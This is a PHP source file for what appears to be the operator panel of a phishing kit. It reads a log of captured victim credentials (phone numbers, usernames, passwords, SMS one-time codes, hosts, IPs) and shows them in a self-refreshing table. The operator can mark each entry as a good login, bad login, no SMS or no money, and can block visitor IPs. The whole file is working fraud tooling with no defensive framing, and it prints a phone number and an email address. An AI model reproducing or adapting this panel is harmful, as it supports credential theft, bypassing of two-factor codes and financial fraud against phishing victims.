<?php
require("pass.php");
$reason = @$_POST['reason'];
$user = @$_POST['user'];
$file = file('srv1log.txt');
$filepath = 'srv1log.txt';
$show = @$_GET['showall'];
if ($user != "") {
function getLineWithString($file, $str) {
foreach ($file as $lineNumber => $line) {
        if (strpos($line, $str) !== false) {
            return "$lineNumber#$line";
        }
    }
    return -1;
}
$linenumberanddata = getLineWithString($file,"$user");
$theline = explode("#","$linenumberanddata");
$line_i_am_looking_for = $theline[0];
$time = $theline[1];
$phone = $theline[2];
$user = $theline[3];
$pass = $theline[4];
$sms = $theline[5];
$hostname = $theline[6];
$lines = file( $filepath , FILE_IGNORE_NEW_LINES );
$lines[$line_i_am_looking_for] = "$time#$phone#$user#$pass#$sms#$hostname#$reason#";
file_put_contents( $filepath , implode( "\r\n", $lines ) );; 
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Main Panel - Server 1</title>
<?php if ($show != "1") { echo '<meta http-equiv="refresh" content="5; url=index.php?showall=0">'; } ?>
</head>
<body>
<p align="center" style="font-size: 11px;">3125931449</p>
<p align="center" style="font-size: 11px;">gabormursa@yahoo.com</p>
<?php if ($show != "1") { echo '<p align="center" style="font-size: 15px;"> </p>'; } ?>
<?php
$file = file('srv1log.txt');
if ($show == 1) {
	 global $good;
	 global $sms;
	 global $bad;
	 global $money;
	 global $lines;
	 $good="0";$sms="0";$bad="0";$money="0";
 foreach ($file as $line) {
      if (strpos($line,"GOOD")) { $good++; }
      if (strpos($line,"NO SMS")) { $sms++; }
      if (strpos($line,"BAD LOGIN")) { $bad++; }
      if (strpos($line,"NO MONEY")) { $money++; }
}
$lines = count($file);
print "<p align=\"center\" style=\"font-size: 20px; font-weight: bold;\"> Total: $lines -> <span style=\"color: green\"> Good: $good;</span>
<span style=\"color: red\">  SMS: $sms; BAD Login: $bad; Money: $money; Pending:" . ($lines-$good-$sms-$bad-$money) . "</span>" ;
}
?>
<p align="center">
<a href="index.php?showall=<?php print "$show";?>">
<input type="button" style="width: 70%; height: 30px; text-align: center; v-align: center; display: block;" value="REFRESH"></a>
<a href="index.php?showall=1"><br>
<input type="button" style="width: 10%; color: red; height: 30px; " align="left" value="SHOW ALL"></a>
<a href="index.php?showall=0">
<input type="button" style="width: 10%; color: green; height: 30px;" align="left" value="SHOW NEW"></a></p>

<table width="1400" height="33" border="1" align="center" >
  <tr>
    <td width="60"><strong>Time</strong></td>
    <td width="120"><div align="center"><strong>Phone no</strong></td>
    <td width="150"><div align="center"><strong>User</strong></td>
    <td width="150"><div align="center"><strong>Pass</strong></td>
    <td width="70"><div align="center"><strong>SMS</strong></td>
    <td width="60"><div align="center"><strong>HOST</strong></div></td>
    <td width="80"><div align="center"><strong>STATUS</strong></div></td>
    <td width="270"><div align="center"><strong>ACTION</strong></div></td>
  </tr>

<?php
$now = time();
$file = file('srv1log.txt');
foreach ($file as $data) {
	$info = explode("#",$data);
	if( count($info) < 8) continue;
	$time = $info[0];
	$phone = $info[1];
	$user = $info[2];
	$pass = $info[3];
	$sms = $info[4];
	$hostname = $info[5];
	$reason = $info[6];
	$ip = $info[7];
	$time = $now - $time;
	$time = gmdate("H:i:s", $time);
	if ($sms == "") { $sms = "------"; }
	if ($hostname == "") { $hostname = "----"; }
	if ($reason == "") {
	echo '
	<tr>
    <td>' . $time . '</td>
    <td style="color: #666633; font-weight: bold"><div align="center">' . $phone . '</td>
    <td style="color: #33CC00; font-weight: bold"><div align="center">' . $user . '</div></td>
    <td style="color: #33CC00; font-weight: bold"><div align="center">' . $pass . '</div></td>
    <td style="color: #0000FF; font-weight: bold"><div align="center">' . $sms . '</div></td>
    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $hostname . '</div></td>
    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $reason . '</div></td>
    <form action="index.php?showall=' .$show. '" method="post">
	<td style="color: #FF0000; font-weight: bold"> <div align="center">
	<input type="hidden" name="user" value="' . $user . '">
	<button type="submit" name="reason" value="BAD LOGIN">!LOGIN</button>
	<button type="submit" name="reason" value="NO SMS">!SMS</button>
	<button type="submit" name="reason" value="NO MONEY">!MONEY</button>
	&nbsp;<button type="submit" style="color: green; font-weight: bold;" name="reason" value="GOOD">OK!</button>
	&nbsp;<button type="submit" name="reason" value="" style="">CLEAR</button>
<a href="a.php?block=' . $ip . '" target=_blank><button type="button" style="color:red; font-weight: bold;">BLOCK</button></a></div>
	</td>
  </form></tr>';
}
	elseif (($reason != "") && (@$show == 1)) {
	echo '
	<tr>
    <td>' . $time . '</td>
    <td style="color: #666633; font-weight: bold"><div align="center">' . $phone . '</td>
    <td style="color: #33CC00; font-weight: bold"><div align="center">' . $user . '</div></td>
    <td style="color: #33CC00; font-weight: bold"><div align="center">' . $pass . '</div></td>
    <td style="color: #0000FF; font-weight: bold"><div align="center">' . $sms . '</div></td>
    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $hostname . '</div></td>
    <td style="color: #FF0000; font-weight: bold"> <div align="center">' . $reason . '</div></td>
    <form action="index.php?showall=' .$show. '" method="post">
	<td style="color: #FF0000; font-weight: bold"> <div align="center">
	<input type="hidden" name="user" value="' . $user . '">
	<button type="submit" name="reason" value="BAD LOGIN">!LOGIN</button>
	<button type="submit" name="reason" value="NO SMS">!SMS</button>
	<button type="submit" name="reason" value="NO MONEY">!MONEY</button>
	&nbsp;<button type="submit" style="color: green; font-weight: bold;" name="reason" value="GOOD">OK!</button>
	&nbsp;<button type="submit" name="reason" value="" style="">CLEAR</button>
<a href="a.php?block=' . $ip . '" target=_blank><button type="button" style="color:red; font-weight: bold;">BLOCK</button></a></div>
	</td>
  </form></tr>';
}
}
?>
</table>
</body>
</html>

